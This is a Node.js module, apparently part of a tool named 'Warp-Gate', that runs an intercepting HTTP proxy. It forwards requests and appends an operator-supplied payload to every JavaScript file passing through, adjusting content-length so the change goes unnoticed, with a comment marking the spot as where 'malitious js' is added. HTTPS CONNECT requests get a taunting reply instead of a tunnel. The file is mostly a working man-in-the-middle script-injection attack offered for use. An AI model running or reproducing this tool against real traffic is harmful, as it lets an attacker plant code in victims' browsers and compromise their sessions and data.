var url = require('url'), // for parsing url
    path = require('path'), // for parsing url
    util = require('./util.js'),
    zlib = require('zlib'),
    gzip = zlib.createGzip();
module.exports = {

    run: function(service,port,payload,iOptions){


        var warp = function(request,response){
            var parseReq = url.parse(request.url, true); // parse the requested url

            var options = {
                host: parseReq.host,
                port: parseReq.port,
                path: parseReq.path,
                method: request.method,
                headers: request.headers,
            };

            // log request
            console.info(request.connection.remoteAddress + ": " + request.method + " " + request.url);

            // check if js file
            var isJs = false; // lel doesnt work with jquery.fancybox-buttons.js?v=1.0.5
            //            console.log(options.path)

            if (path.extname(options.path) == ".js") isJs = true;


            // remove encoding cause its causing issues
            delete options.headers['accept-encoding']

            var proxy_request = service.request(options, function(proxy_response) {
                proxy_response.headers['Proxy-agent'] = "Warp-Gate";
                // set expires here
                // add length here
                if (isJs){
                    var finLength = parseInt(proxy_response.headers['content-length']) +
                        Buffer.byteLength(payload, 'utf8');

                    proxy_response.headers['content-length'] = finLength;
                }
                // start writing the headers back to client
                response.writeHead(proxy_response.statusCode, proxy_response.headers);

                // variable to store the total chunk data
                var totalchunk = '';

                proxy_response.addListener('data', function(chunk) { // the returned data is recieved and sent in chunks
                    // acctuall data or body from site
                    totalchunk += chunk.toString('binary'); // concatonate  all the chunks
                    response.write(chunk, 'binary');
                });

                proxy_response.addListener('end', function() { // when the server finished sending the data save to cauche and end client connection
                    // append malitious js here
                    var encoding = proxy_response.headers['content-encoding'];
                    if (isJs) response.end(payload)
                    else response.end();

                });

                proxy_response.addListener('error', function(e) { // on server error send 504
                    console.error('Problem with request ', e);
                    util.sendClient(response, 504, "<h1>504 Gateway Timeout</h1>");
                });

            });
            proxy_request.addListener('error', function(e) { // on server error send 504
                console.error('Problem with proxy request ', e);
                util.sendClient(response, 504, "<h1>504 Gateway Timeout</h1>");
            });
            // when client sends data suck as post data write to the proxy request
            request.addListener('data', function(chunk) {
                proxy_request.write(chunk, 'binary');
            });
            // when the  client has finished requesting end the proxy request
            request.addListener('end', function() {
                proxy_request.end();
            });
            // on client error send back 400
            request.addListener('error', function(e) {
                console.error('Problem with client request ', e);
                util.sendClient(response, 400, "<h1>400 Bad Request</h1>");
            });

        };

        // where the code stats calling functions

        // check which service to start
        //        if(iOptions) var server = service.createServer(iOptions,warp).listen(port);
        var server = service.createServer(warp).listen(port);
        // using http connect proxy https
        server.addListener('connect', function(request, socket, head) {
            var url = request['url'];
            var httpVersion = request['httpVersion'];
            socket.write( "HTTP/" + httpVersion + " 200 Connection established\r\n\r\n" );

            socket.write("lel got you");
            socket.end();
        });
    },

};
